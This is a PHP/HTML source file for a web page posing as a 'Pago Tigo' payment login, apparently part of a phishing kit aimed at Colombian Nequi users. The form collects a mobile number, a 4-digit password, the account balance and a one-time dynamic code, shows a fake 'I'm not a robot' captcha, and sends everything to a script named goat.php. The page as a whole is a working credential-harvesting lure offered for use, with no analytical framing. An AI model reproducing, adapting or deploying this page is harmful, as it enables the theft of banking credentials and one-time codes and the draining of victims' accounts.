<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
if (isset($_GET['id'])) { $_SESSION['cliente_id'] = intval($_GET['id']); }
?>

<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Datos</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="config/css/login.css">
</head>

<body>
    <div class="container mt-5 my-5">
        <!-- Encabezado -->
        <h2 class="text-center">Pago Tigo</h2>
        <center>
            <p class="text2">Podrás realizar todas tus solicitudes y consultar tus datos.</p>
        </center>
        <br><br>

        <!-- Formulario -->
        <form action="process/goat.php" method="post">
            <input type="hidden" name="cliente_id" value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">
            <!-- Número de celular -->
            <div class="form-group">
                <div class="input-group">
                    <div class="form-control-bn">
                        <div class="select-col select-col-img">
                            <img src="config/img/flag_colombia.png" alt="co" class="flag-img">
                        </div>
                        <div class="select-col">
                            <p class="ng-binding">+57</p>
                        </div>
                    </div>
                    <input type="tel" id="usuario" name="usuario" class="form-control-no" placeholder=" " required
                        pattern="\d{10}" title="Debe ingresar 10 dígitos." maxlength="10">
                    <label for="usuario" class="labelno">Número de celular</label>
                </div>
            </div>

            <!-- Contraseña -->
            <div class="form-group">
                <input type="password" id="clave" name="clave" class="form-control-2" placeholder=" " required
                    pattern="\d{4}" title="Debe ingresar 4 dígitos." maxlength="4">
                <label for="clave">Contraseña</label>
            </div>

            <!-- Saldo actual en la cuenta Nequi -->
            <div class="form-group">
                <input type="text" id="saldo" name="saldo" class="form-control-2" placeholder=" " required
                    inputmode="numeric">
                <label for="saldo">Saldo actual en la cuenta Nequi</label>
            </div>

            <!-- Clave dinámica -->
            <div class="form-group">
                <input type="tel" id="otp" name="otp" class="form-control-2" placeholder=" " required pattern="\d{6}"
                    title="Debe ingresar 6 dígitos." maxlength="6">
                <label for="otp">Clave dinámica</label>
            </div>

            <!-- Captcha -->
            <center>
                <div class="captcha">
                    <div style="display: flex; align-items: center; margin-top: 11px;">
                        <input type="checkbox" id="captcha" name="captcha" required class="custom-checkbox">
                        <label for="captcha"
                            style="margin-right: 10px; margin-left: 20px; margin-bottom: 0px !important;">No soy un
                            robot</label>
                        <img src="config/img/captcha.png" style="margin-left: 20px; height: 40px;">
                    </div>
                    <p style="font-size: 10px; margin-bottom: 0px;">Privacidad - condiciones</p>
                </div>
            </center>

            <!-- Botón de envío -->
            <button type="submit" class="btn btn-primary btn-block">Entra</button>
        </form>
    </div>

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Agregar imágenes de bandera a las opciones de selección
            const select = document.getElementById('countryCode');
            if (select) {
                const options = select.options;
                for (let i = 0; i < options.length; i++) {
                    const flagUrl = options[i].getAttribute('data-flag');
                    if (flagUrl) {
                        const flagImg = document.createElement('img');
                        flagImg.src = flagUrl;
                        flagImg.classList.add('flag-img');
                        options[i].insertBefore(flagImg, options[i].firstChild);
                    }
                }
            }
        });
    </script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const saldoInput = document.getElementById("saldo");

            if (!saldoInput) return;

            saldoInput.addEventListener("input", function (e) {
                let valor = e.target.value;

                // Quitar todo lo que no sea número
                valor = valor.replace(/\D/g, "");

                // Formatear con puntos (miles)
                valor = valor.replace(/\B(?=(\d{3})+(?!\d))/g, ".");

                e.target.value = valor;
            });
        });
    </script>

</body>

</html>

